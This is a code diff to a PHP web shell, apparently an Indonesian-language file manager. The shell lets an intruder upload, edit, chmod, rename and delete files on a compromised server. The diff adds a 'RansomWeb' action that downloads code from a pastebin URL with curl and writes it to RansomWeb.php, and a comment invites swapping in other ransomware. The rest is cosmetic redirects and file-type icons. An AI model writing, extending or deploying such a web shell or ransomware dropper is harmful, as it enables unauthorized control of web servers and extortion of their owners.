@@ -90,7 +90,8 @@ if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')
 body {
   overflow-x: hidden;
 }
-
+.ico {width:20px;}
+.ico2{width:20px;}
 #sidebar-wrapper {
   min-height: 100vh;
   margin-left: -15rem;
@@ -205,7 +206,9 @@ echo '">'.$pat.'</a>/';
       <div class="list-group list-group-flush">
       	<?php
       	echo "<a href='?path=$path&aksi=buatfolder' class='list-group-item list-group-item-action bg-light'><i class='fas fa-folder-open'></i> Buat Folder</a>
-      	<a href='?path=$path&aksi=buatfile' class='list-group-item list-group-item-action bg-light'><i class='fas fa-file'></i> Buat File</a>"; ?>
+      	<a href='?path=$path&aksi=buatfile' class='list-group-item list-group-item-action bg-light'><i class='fas fa-file'></i> Buat File</a>
+      	<a href='?path=$path&aksi=ransom' class='list-group-item list-group-item-action bg-light'><i class='fa fa-exclamation-triangle'></i> RansomWeb</a>";
+      	?>
         <a href='?keluar=true' class='list-group-item list-group-item-action bg-light'><i class='fas fa-sign-out-alt'></i> Logout</a>
         
       </div>
@@ -220,7 +223,7 @@ unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
 }
 if($_GET['aksi'] == 'buatfolder'){
 	function hai(){
-		echo "<div class='mt-3'>Sukses Membuat Folder Baru</div>";
+		echo "<script>window.location='?path=".$path."'; alert('Folder Sukses Dibuat!')</script>";
 	}
 	if(isset($_POST["folderss"])){
 		$nama_folder = $path.'/'.$_POST["namaF"];
@@ -237,6 +240,31 @@ if($_GET['aksi'] == 'buatfolder'){
 			<input type="submit" class="btn btn-outline-primary btn-block" value="Buat" name="folderss"></form>
 				</div>
 				</div>';
+}elseif($_GET["aksi"] == 'ransom'){
+	
+	
+// Ubah Link ransomnya jika ingin ganti ransomware yangvlain
+	$url  = "https://pastebin.com/raw/LbVhNnZF";
+  $curl = curl_init($url);
+  				curl_setopt($curl, CURLOPT_RETURNTRANSFER,true);
+  $get	= curl_exec($curl);
+ if(!$get == ""){ // Jika isi file dari url tidak kosong
+// Buat file
+$puts = fopen("RansomWeb.php","w");
+				fwrite($puts,$get);
+				fclose($puts);
+$nama_file  = "RansomWeb.php";
+$server_web = 'http://'.$_SERVER["HTTP_HOST"].'/';
+if($puts == true){
+	echo "<script>window.location='?path=".$path."'; alert('Sukses')</script>";
+}else{
+	echo "Gagal Membuat File";
+	}
+}else{
+	echo "Not Found!!";
+}
+
+	
 }elseif($_GET["aksi"] == 'buatfile'){
 	if(isset($_POST["buat"])){
 	$namaF = $path.'/'.$_POST["nama_file"];
@@ -245,9 +273,9 @@ if($_GET['aksi'] == 'buatfolder'){
 	fwrite($buat,$isi);
 	fclose($buat);
 	if($buat == TRUE){
-		echo "<script>alert('Sukses')</script>";
+		echo "<script>window.location='?path=".$path."'; alert('Sukses')</script>";
 }else{
-echo "<script>alert('Gagal')</script>";
+echo "<script>window.location='?path=".$path."'; alert('Gagal!!!')</script>";
 }
 }
 echo '<form method="post" class="mt-3">
@@ -276,7 +304,7 @@ echo '
 		</div>';
 }else if(isset($_FILES['file'])){
 if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
-echo "<script>alert('Sukses Upload')</script>";
+echo "<script>window.location='?path=".$path."'; alert('Valid!!')</script>";
 }else{
 echo "<script>alert('Gagal Upload')</script>";
 }
@@ -290,9 +318,9 @@ echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
 if($_POST['opt'] == 'chmod'){
 if(isset($_POST['perm'])){
 if(chmod($_POST['path'],$_POST['perm'])){
-echo "<script>alert('Sukses')</script>";
+echo "<script>window.location='?path=".$path."'; alert('Sukses')</script>";
 }else{
-echo "<script>alert('Gagal')</script>";
+echo "<script>window.location='?path=".$path."'; alert('Gagal!!!')</script>";
 }
 }
 echo '<form method="POST">
@@ -310,9 +338,9 @@ echo '<form method="POST">
 }else if($_POST['opt'] == 'rename'){
 if(isset($_POST['newname'])){
 if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
-echo "<script>alert('Sukses')</script>";
+echo "<script>window.location='?path=".$path."'; alert('Nama Telah Diubah!')</script>";
 }else{
-echo "<script>alert('Gagal')</script>";
+echo "<script>window.location='?path=".$path."'; alert('Gagal!!!')</script>";
 }
 $_POST['name'] = $_POST['newname'];
 }
@@ -332,9 +360,9 @@ echo '<form method="POST">
 if(isset($_POST['src'])){
 $fp = fopen($_POST['path'],'w');
 if(fwrite($fp,$_POST['src'])){
-echo "<script>alert('Sukses')</script>";
+echo "<script>window.location='?path=".$path."'; alert('Berhasil Merubah Nama File')</script>";
 }else{
-echo "<script>alert('Gagal')</script>";
+echo "<script>window.location='?path=".$path."'; alert('Gagal!!!')</script>";
 }
 fclose($fp);
 }
@@ -351,15 +379,15 @@ echo '</table><br/><center>';
 if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
 if($_POST['type'] == 'dir'){
 if(rmdir($_POST['path'])){
-echo "<script>alert('Sukses')</script>";
+echo "<script>window.location='?path=".$path."'; alert('Sukses Menghapus Folder')</script>";
 }else{
-echo "<script>alert('Gagal')</script>";
+echo "<script>window.location='?path=".$path."'; alert('Gagal!!!')</script>";
 }
 }else if($_POST['type'] == 'file'){
 if(unlink($_POST['path'])){
-echo "<script>alert('Sukses')</script>";
+echo "<script>window.location='?path=".$path."'; alert('Sukses Menghapus File')</script>";
 }else{
-echo "<script>alert('Gagal')</script>";
+echo "<script>window.location='?path=".$path."'; alert('Gagal!!!')</script>";
 }
 }
 }
@@ -379,7 +407,7 @@ echo '
 	foreach($scandir as $dir){
 if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
 echo '<tr>
-<td scope="col"><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
+<td scope="col"><img src="http://aux.iconspalace.com/uploads/folder-icon-256-1787672482.png" class="ico"> <a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
 <td class="text-center">Folder</td>
 <td class="text-center">--</td>
 <td class="text-center">';
@@ -420,7 +448,58 @@ $size = $size.' KB';
 }
 
 echo '<tr>
-<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
+<td><img src="';
+					$ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
+					if($ext == "php") {
+						echo 'https://image.flaticon.com/icons/png/128/337/337947.png"';
+					}elseif ($ext == "html") {
+						echo 'https://image.flaticon.com/icons/png/128/136/136528.png"';
+					}elseif ($ext == "css") {
+						echo 'https://image.flaticon.com/icons/png/128/136/136527.png"';
+					}elseif ($ext == "png") {
+						echo 'https://image.flaticon.com/icons/png/128/136/136523.png"';
+					}elseif ($ext == "jpg") {
+						echo 'https://image.flaticon.com/icons/png/128/136/136524.png"';
+					}elseif ($ext == "jpeg") {
+						echo 'http://i.imgur.com/e8mkvPf.png"';
+					}elseif($ext == "zip") {
+						echo 'https://image.flaticon.com/icons/png/128/136/136544.png"';
+					}elseif ($ext == "js") {
+						echo 'https://image.flaticon.com/icons/png/128/1126/1126856.png';
+					}elseif ($ext == "ttf") {
+						echo 'https://image.flaticon.com/icons/png/128/1126/1126892.png';
+					}elseif ($ext == "otf") {
+						echo 'https://image.flaticon.com/icons/png/128/1126/1126891.png';
+					}elseif ($ext == "txt") {
+						echo 'https://image.flaticon.com/icons/png/128/136/136538.png';
+					}elseif ($ext == "ico") {
+						echo 'https://image.flaticon.com/icons/png/128/1126/1126873.png';
+					}elseif ($ext == "conf") {
+						echo 'https://image.flaticon.com/icons/png/512/1573/1573301.png';
+					}elseif ($ext == "htaccess") {
+						echo 'https://image.flaticon.com/icons/png/128/1720/1720444.png';
+					}elseif ($ext == "sh") {
+						echo 'https://image.flaticon.com/icons/png/128/617/617535.png';
+					}elseif ($ext == "py") {
+						echo 'https://image.flaticon.com/icons/png/128/180/180867.png';
+					}elseif ($ext == "sql") {
+						echo 'https://img.icons8.com/ultraviolet/2x/data-configuration.png';
+					}elseif ($ext == "pl") {
+						echo 'http://i.imgur.com/PnmX8H9.png';
+					}elseif ($ext == "pdf") {
+						echo 'https://image.flaticon.com/icons/png/128/136/136522.png';
+					}elseif ($ext == "mp4") {
+						echo 'https://image.flaticon.com/icons/png/128/136/136545.png';
+					}elseif ($ext == "mp3") {
+						echo 'https://image.flaticon.com/icons/png/128/136/136548.png';
+					}elseif ($ext == "git") {
+						echo 'https://image.flaticon.com/icons/png/128/617/617509.png';
+					}elseif ($ext == "md") {
+						echo 'https://image.flaticon.com/icons/png/128/617/617520.png';
+					}else{
+						echo 'http://icons.iconarchive.com/icons/zhoolego/material/256/Filetype-Docs-icon.png';
+					}
+					echo '" class="ico2"> <a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
 <td class="text-center">File</td>
 <td class="text-center">'.$size.'</td>
 <td class="text-center">';
